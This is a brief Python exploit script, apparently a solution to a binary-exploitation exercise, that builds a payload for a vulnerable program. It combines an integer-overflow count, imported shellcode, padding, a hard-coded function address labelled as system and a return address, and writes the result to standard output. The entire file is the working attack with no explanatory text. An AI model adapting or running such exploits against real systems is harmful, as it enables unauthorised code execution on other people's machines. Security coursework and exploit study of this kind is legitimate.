
import sys
from shellcode import shellcode
count = b"1073741838"
addr = 0x804fef0.to_bytes(4, "little") #system address
ret_addr= 0xfff6b9ac.to_bytes(4,"little") #return address for main +4
sys.stdout.buffer.write(count + shellcode + b"A"*3 + addr + ret_addr)
